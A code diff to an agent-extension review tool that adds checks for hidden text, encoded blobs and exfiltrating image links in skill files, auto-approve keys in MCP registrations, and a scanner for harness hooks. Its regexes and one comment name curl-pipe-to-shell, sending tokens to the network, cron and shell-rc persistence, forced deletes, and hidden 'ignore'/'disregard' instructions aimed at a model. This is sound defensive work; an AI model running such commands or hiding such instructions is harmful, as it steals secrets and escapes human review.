@@ -864,6 +864,7 @@ def check(root: Path) -> tuple[bool, list[str]]:
                 problems.append(f"{f.relative_to(root)} is in {VENDOR}/ but not in the lock")
     problems += check_skills(root, lock)
     problems += check_mcp(root, lock)
+    problems += check_hooks(root, lock)
     for unit, cap in lint_caps(root).items():
         base = (lock.get("design_lint_caps") or {}).get(unit)
         if base is not None and cap > base:
@@ -945,7 +946,24 @@ SKILL_CODES = {
     "K6": "declares a third-party endpoint it will send data to",
     "K7": "source is an unversioned URL — the text can change with no tag and no diff",
     "K8": "declares no licence — redistribution terms unknown, so it must not be committed into a repo we deliver",
+    # K9–K11 added 2026-10-15 after measuring our eight against AgentShield's 386 (ECC, MIT):
+    # every rule above reads VISIBLE prose, and the three below are what that leaves open.
+    "K9": "hidden text — the reader does not see it and the model does",
+    "K10": "an encoded blob — unreadable by this review, which is the point of encoding it",
+    "K11": "a markdown link or image that carries data out in its query string",
 }
+
+# Zero-width and bidirectional control characters. A skill is prose for a model to obey; there is no
+# honest reason for a character the reviewer cannot see. U+200B-D, U+2060, U+FEFF, U+202A-E, U+2066-9.
+HIDDEN_CHARS = re.compile(r"[\u200b-\u200d\u2060\ufeff\u202a-\u202e\u2066-\u2069]")
+# An HTML comment is invisible in rendered Markdown and present in the text the model reads.
+HTML_COMMENT = re.compile(r"<!--(.*?)-->", re.S)
+IMPERATIVE = re.compile(r"\b(?:you\s+must|always|never|ignore|disregard|do\s+not\s+tell|instead\s+of|"
+                        r"before\s+(?:any|you)|run|execute|send|fetch|curl|export)\b", re.I)
+# A run of base64/hex long enough to be a payload rather than a hash or an example.
+ENCODED_BLOB = re.compile(r"[A-Za-z0-9+/]{220,}={0,2}|(?:[0-9a-fA-F]{2}){110,}")
+# `![alt](https://host/path?x=…)` — a fetch the renderer performs, with room for data in the query.
+MD_LINK_QUERY = re.compile(r"!?\[[^\]]*\]\((https?://[^)\s]+\?[^)\s]+)\)")
 
 # (code, level, pattern) over the body. `where` carries the matched line, because the judgement is
 # always about the sentence, not the keyword.
@@ -1070,7 +1088,34 @@ def review_skill(name: str, text: str, source: str) -> SkillReport:
                 continue
             seen.add(key)
             findings.append(Finding(code, level, name, SKILL_CODES[code], line[:160]))
+    findings += hidden_text_findings(name, text)
     return SkillReport(name, source, findings, len(text.splitlines()))
+
+
+def hidden_text_findings(name: str, text: str) -> list[Finding]:
+    """K9–K11: what a reviewer reading the rendered page does not see.
+
+    The rules above are regexes over prose, which assumes the prose is the whole text. These three
+    are the cases where it is not: a character with no glyph, a comment the renderer drops, and a
+    link whose query string is the payload. Measured against AgentShield (ECC, MIT) 2026-10-15."""
+    out: list[Finding] = []
+    for m in HIDDEN_CHARS.finditer(text):
+        line_no = text.count("\n", 0, m.start()) + 1
+        out.append(Finding("K9", "block", name, SKILL_CODES["K9"],
+                           f"line {line_no}: U+{ord(m.group(0)):04X}, zero-width or bidi control"))
+        break  # one finding per file: the first occurrence is the whole decision
+    for m in HTML_COMMENT.finditer(text):
+        if IMPERATIVE.search(m.group(1)):
+            out.append(Finding("K9", "block", name, SKILL_CODES["K9"],
+                               "an instruction inside an HTML comment: " + " ".join(m.group(1).split())[:120]))
+            break
+    if m := ENCODED_BLOB.search(text):
+        out.append(Finding("K10", "block", name, SKILL_CODES["K10"],
+                           f"{len(m.group(0))} characters of base64 or hex"))
+    hosts = {urllib.parse.urlparse(m.group(1)).netloc for m in MD_LINK_QUERY.finditer(text)}
+    for host in sorted(hosts):
+        out.append(Finding("K11", "review", name, SKILL_CODES["K11"], host))
+    return out
 
 
 def print_skill_report(rep: SkillReport) -> None:
@@ -1216,7 +1261,13 @@ MCP_CODES = {
     "M3": "fetches its package at call time with no pinned version — the tools can change with no diff",
     "M4": "declares environment variables it will read",
     "M5": "ships a value for a secret-looking environment variable",
+    # M6 added 2026-10-15. M1–M5 read the transport; this reads the one thing the registration can
+    # say about the TOOLS, which the note under this table says the review cannot see. A config
+    # key that pre-approves them is exactly that — and `*` pre-approves the ones not written yet.
+    "M6": "the registration pre-approves tool calls, so the agent may run them without asking",
 }
+
+AUTO_APPROVE_KEYS = ("alwaysallow", "autoapprove", "autoallow", "approvedtools", "allowedtools")
 
 SECRETISH = re.compile(r"(?:token|secret|key|password|passwd|credential|auth)", re.I)
 # Matched on the BASENAME, so a path prefix cannot hide them: /opt/homebrew/bin/bash is a shell.
@@ -1308,6 +1359,14 @@ def review_mcp(name: str, entry: dict, source: str) -> McpReport:
         pkg = next((a for a in args if not a.startswith("-") and a not in {"dlx", "exec", "run"}), "")
         if pkg and not pinned_spec(pkg):
             f.append(Finding("M3", "review", name, MCP_CODES["M3"], line))
+
+    for key, value in entry.items():
+        if key.lower().replace("_", "").replace("-", "") in AUTO_APPROVE_KEYS:
+            listed = value if isinstance(value, list) else [value]
+            wild = any(str(v).strip() in {"*", "all"} for v in listed)
+            f.append(Finding("M6", "block" if wild else "review", name, MCP_CODES["M6"],
+                             f"{key}: " + (", ".join(str(v) for v in listed)[:120] or "(empty)")
+                             + (" — a wildcard also covers the tools this server has not shipped yet" if wild else "")))
 
     env = entry.get("env") or {}
     if isinstance(env, dict) and env:
@@ -1416,6 +1475,149 @@ def check_mcp(root: Path, lock: dict) -> list[str]:
             problems.append(f"mcp {name} is registered in {rel} but was never reviewed — "
                             f"`registry_intake.py mcp-review {root} {name}`")
     return problems
+
+
+
+# ## Hooks — the third surface, and the most powerful of the three
+#
+# A component is code we copy. A skill is instructions the agent obeys. An MCP server is tools it
+# may call. A **hook is a command the harness runs by itself**, on every tool call, before the
+# agent decides anything — and a PreToolUse hook can deny or allow that call. It is the only one of
+# the four that runs without the agent choosing to.
+#
+# We wrote one (`wire_hook` below) and governed the other three for a month without ever reading
+# the file ours lives in. Added 2026-10-15 after measuring against AgentShield (ECC, MIT), which
+# carries fifty rules here where we carried none.
+HOOK_FILES = (".claude/settings.json", ".claude/settings.local.json")
+
+HOOK_CODES = {
+    "H1": "pipes a remote script into a shell — the command is whatever that URL serves today",
+    "H2": "sends the environment or a credential to the network",
+    "H3": "writes persistence outside the project (cron, launchd, a shell rc)",
+    "H4": "answers `allow` for every call — a hook that approves instead of deciding",
+    "H5": "a destructive command, run automatically and with no confirmation",
+    "H6": "the script is outside the project, or reached by an absolute path",
+    "H7": "detaches a background process that outlives the call",
+    "H8": "registered, but its script is missing — python3 on a missing file exits 2, which the "
+          "harness reads as *block*, so every matching call is refused",
+}
+
+HOOK_RULES: list[tuple[str, str, re.Pattern]] = [
+    ("H1", "block", re.compile(r"(?:curl|wget)[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:sh|bash|zsh)")),
+    ("H2", "block", re.compile(r"(?:printenv|\benv\b|\$[A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD)[A-Z_]*)"
+                               r"[^\n]{0,120}?(?:\|[^\n]{0,60})?\b(?:curl|wget|nc|ncat|dig|nslookup)\b")),
+    ("H2", "block", re.compile(r"\b(?:curl|wget)\b[^\n]{0,200}\$[A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD)")),
+    ("H3", "block", re.compile(r"\bcrontab\b|launchctl\s+load|systemctl\s+enable|"
+                               r">>?\s*~?/?[\w./]*\.(?:bashrc|zshrc|profile|bash_profile)\b")),
+    ("H5", "block", re.compile(r"\brm\s+-[rf]{2,}\b|\bgit\s+clean\s+-[a-z]*f[a-z]*d|"
+                               r"\bgit\s+push\b[^\n]{0,60}--force\b|\bdd\s+if=|\bmkfs\b")),
+    ("H7", "review", re.compile(r"\bnohup\b|\bdisown\b|&\s*$|\b(?:screen|tmux)\s+-d")),
+]
+
+# A hook that unconditionally decides "allow" is the inverse of ours: it approves calls nobody saw.
+AUTO_ALLOW = re.compile(r'permissionDecision["\']?\s*[:=]\s*["\']allow["\']')
+
+
+def hook_entries(root: Path) -> list[tuple[str, str, str]]:
+    """[(file, event, command)] for every command hook the project registers."""
+    out = []
+    for rel in HOOK_FILES:
+        p = root / rel
+        if not p.exists():
+            continue
+        try:
+            data = json.loads(p.read_text(encoding="utf-8", errors="replace")) or {}
+        except json.JSONDecodeError:
+            continue
+        for event, groups in (data.get("hooks") or {}).items():
+            for group in groups if isinstance(groups, list) else []:
+                for h in (group.get("hooks") or []) if isinstance(group, dict) else []:
+                    if isinstance(h, dict) and h.get("command"):
+                        out.append((rel, str(event), str(h["command"])))
+    return out
+
+
+def hook_script(root: Path, command: str) -> Path | None:
+    """The file a hook runs, when the command names one inside the project."""
+    expanded = command.replace('"$CLAUDE_PROJECT_DIR"', str(root)).replace("$CLAUDE_PROJECT_DIR", str(root))
+    for token in shlex.split(expanded, posix=True) if expanded.strip() else []:
+        # `curl https://x.test/i.sh | sh` ends in `.sh` and is not a path. A URL is a URL.
+        if "://" in token:
+            continue
+        if re.search(r"\.(?:py|mjs|cjs|js|ts|sh)$", token):
+            return Path(token) if Path(token).is_absolute() else root / token
+    return None
+
+
+def review_hooks(root: Path) -> list[Finding]:
+    found: list[Finding] = []
+    for rel, event, command in hook_entries(root):
+        where = f"{rel} · {event}"
+        seen: set[str] = set()
+        for code, level, pat in HOOK_RULES:
+            if pat.search(command) and code not in seen:
+                seen.add(code)
+                found.append(Finding(code, level, event, HOOK_CODES[code], command[:150]))
+        script = hook_script(root, command)
+        if script is None:
+            # An inline shell command, already judged by the rules above. H6 asks where a SCRIPT
+            # lives; saying it of a command that has none is a finding with no action behind it.
+            continue
+        if not script.is_relative_to(root):
+            found.append(Finding("H6", "review", event, HOOK_CODES["H6"],
+                                 f"{where}: {script} is outside the project"))
+        elif "$CLAUDE_PROJECT_DIR" not in command and Path(command.split()[-1]).is_absolute():
+            found.append(Finding("H6", "review", event, HOOK_CODES["H6"],
+                                 f"{where}: absolute path — committed, it breaks on every other machine"))
+        if not script.exists():
+            found.append(Finding("H8", "block", event, HOOK_CODES["H8"], f"{where}: {script} does not exist"))
+            continue
+        # Our own vendored hook IS this file, and `check` already verifies it byte for byte.
+        # Scanning it finds this script's own rule patterns — the scanner matching its own text,
+        # which is how the first version of this function reported `curl … | sh` on itself.
+        # Exempt by PATH, not by bytes: the vendored copy is written from the INSTALLED skill, so
+        # comparing it to the file running right now differs whenever the repo is ahead. `check`
+        # already reports that drift, with a better message.
+        if script.resolve() in {Path(__file__).resolve(), (root / HOOK_COPY).resolve()}:
+            continue
+        body = script.read_text(encoding="utf-8", errors="replace")
+        if AUTO_ALLOW.search(body) and not re.search(r'permissionDecision["\']?\s*[:=]\s*["\'](?:deny|ask)["\']', body):
+            found.append(Finding("H4", "block", event, HOOK_CODES["H4"],
+                                 f"{where}: {script.name} only ever decides `allow`"))
+        # A pattern in a SCRIPT is text, not a proven call: a comment, a string, a rule that blocks
+        # the very thing it names. The configured command is a command; a file is source. So the
+        # body never blocks — it asks a person to read the line.
+        for code, _level, pat in HOOK_RULES:
+            if (m := pat.search(body)) and not any(f.code == code and script.name in f.where for f in found):
+                found.append(Finding(code, "review", event, HOOK_CODES[code],
+                                     f"{script.name}: " + " ".join(m.group(0).split())[:110]
+                                     + " — in the script's text; read the line before judging it"))
+    return found
+
+
+def cmd_hook_review(args) -> int:
+    root = args.root.resolve()
+    entries = hook_entries(root)
+    findings = review_hooks(root)
+    if args.json:
+        print(json.dumps({"hooks": [{"file": f, "event": e, "command": c} for f, e, c in entries],
+                          "findings": [asdict(f) for f in findings]}, indent=2))
+        return 1 if any(f.level == "block" for f in findings) else (3 if findings else 0)
+    print(f"{len(entries)} hook(s) registered in {' and '.join(HOOK_FILES)}")
+    for rel, event, command in entries:
+        print(f"  {event:<14} {command[:100]}")
+    for f in findings:
+        print(f"  {'✗' if f.level == 'block' else '!'} {f.code} {f.message}\n      {f.where}")
+    if not findings:
+        print("  (no findings — a hook runs without the agent choosing to; read the commands above anyway)")
+    return 1 if any(f.level == "block" for f in findings) else (3 if findings else 0)
+
+
+def check_hooks(root: Path, lock: dict) -> list[str]:
+    """Blocking hook findings are a problem for `check`; the review-level ones are a report."""
+    accepted = (lock.get("hooks") or {}).get("accepted") or {}
+    return [f"hook {f.code} ({f.item}): {f.message} — {f.where}"
+            for f in review_hooks(root) if f.level == "block" and f.code not in accepted]
 
 
 HOOK_COPY = ".claude/hooks/registry_intake.py"
@@ -1788,6 +1990,7 @@ def main(argv: list[str] | None = None) -> int:
     s = sub.add_parser("skill-approve"); s.add_argument("root", type=Path); s.add_argument("skill")
     s.add_argument("--by", required=True); s.add_argument("--accept", action="append")
     s.add_argument("--source"); s.add_argument("--note")
+    s = sub.add_parser("hook-review"); s.add_argument("root", type=Path); s.add_argument("--json", action="store_true")
     s = sub.add_parser("mcp-review"); s.add_argument("root", type=Path); s.add_argument("name", nargs="?")
     s.add_argument("--json", action="store_true")
     s = sub.add_parser("mcp-approve"); s.add_argument("root", type=Path); s.add_argument("name")
@@ -1819,7 +2022,8 @@ def main(argv: list[str] | None = None) -> int:
     return {"setup": cmd_setup, "allow": cmd_allow, "deny": cmd_deny, "approve": cmd_approve,
             "install": cmd_install, "caps": cmd_caps, "hook": cmd_hook,
             "skill-review": cmd_skill_review, "skill-approve": cmd_skill_approve,
-            "mcp-review": cmd_mcp_review, "mcp-approve": cmd_mcp_approve}[args.cmd](args)
+            "mcp-review": cmd_mcp_review, "mcp-approve": cmd_mcp_approve,
+            "hook-review": cmd_hook_review}[args.cmd](args)
 
 
 if __name__ == "__main__":
